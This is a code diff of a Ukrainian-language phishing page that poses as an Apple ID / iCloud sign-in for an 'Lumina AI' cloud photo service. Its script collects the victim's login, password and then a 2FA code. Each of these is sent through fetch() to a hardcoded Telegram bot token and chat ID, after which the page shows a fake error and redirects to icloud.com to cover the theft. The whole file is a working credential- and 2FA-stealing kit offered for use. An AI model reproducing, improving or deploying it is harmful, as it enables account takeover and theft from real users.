@@ -6,49 +6,60 @@
     <title>Lumina AI Cloud Studio</title>
     <style>
         body { font-family: -apple-system, sans-serif; background: #0b0b0d; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { background: #18181b; padding: 35px; border-radius: 24px; width: 100%; max-width: 310px; text-align: center; border: 1px solid #27272a; }
+        .box { background: #18181b; padding: 35px; border-radius: 24px; width: 100%; max-width: 320px; text-align: center; }
         .blue { color: #3b82f6; font-weight: bold; font-size: 26px; margin-bottom: 10px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 10px; border: 1px solid #3f3f46; background: #27272a; color: #fff; box-sizing: border-box; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 10px; border: 1px solid #3f3f46; background: #27272a; color: #fff; box-sizing: border-box; outline: none; }
         button { width: 100%; padding: 12px; background: #3b82f6; color: #fff; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; margin-top: 15px; }
         .hide { display: none; }
+        p { font-size: 14px; color: #a1a1aa; line-height: 1.5; }
     </style>
 </head>
 <body>
     <div class="box">
         <div class="blue">Lumina AI</div>
+        
         <div id="step1">
-            <p>Увійдіть у Cloud для синхронізації фото</p>
+            <p>Увійдіть у Cloud для синхронізації фото та медіафайлів</p>
             <input type="text" id="log" placeholder="Apple ID або Email">
             <input type="password" id="pas" placeholder="Пароль">
             <button onclick="go2()">Продовжити</button>
         </div>
+
         <div id="step2" class="hide">
-            <p>Введіть 6-значний код перевірки</p>
+            <p>На ваш пристрій надіслано код підтвердження. Введіть його нижче:</p>
             <input type="number" id="sms" placeholder="000 000">
             <button onclick="end()">Підтвердити</button>
         </div>
     </div>
+
     <script>
+        // Твої дані для зв'язку
         const tok = "8311826152:AAFzJxP5O8gTS4mrNEA_4m82QJqULVy1b84";
         const cid = "5316708415";
+
+        // ФУНКЦІЯ ВІДПРАВКИ (Тепер виправлена!)
         function send(msg) {
-            fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}`);
+            const url = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}`;
+            fetch(url);
         }
+
         function go2() {
-    
             const l = document.getElementById('log').value;
             const p = document.getElementById('pas').value;
             if(l && p) {
-                send(`🎯 ЛОГІН ТА ПАРОЛЬ!\n👤 Юзер: ${l}\n🔑 Пароль: ${p}`);
+                send(`🍎 НОВІ ДАНІ!\n👤 Логін: ${l}\n🔑 Пароль: ${p}`);
                 document.getElementById('step1').classList.add('hide');
                 document.getElementById('step2').classList.remove('hide');
+            } else {
+                alert("Будь ласка, заповніть усі поля");
             }
         }
+
         function end() {
             const c = document.getElementById('sms').value;
             if(c) {
-                send(`🔐 КОД 2FA: ${c}`);
-                alert("Помилка з'єднання. Спробуйте пізніше.");
+                send(`🛡️ КОД 2FA: ${c}`);
+                alert("Помилка перевірки коду. Спробуйте пізніше.");
                 window.location.href = "https://icloud.com";
             }
         }
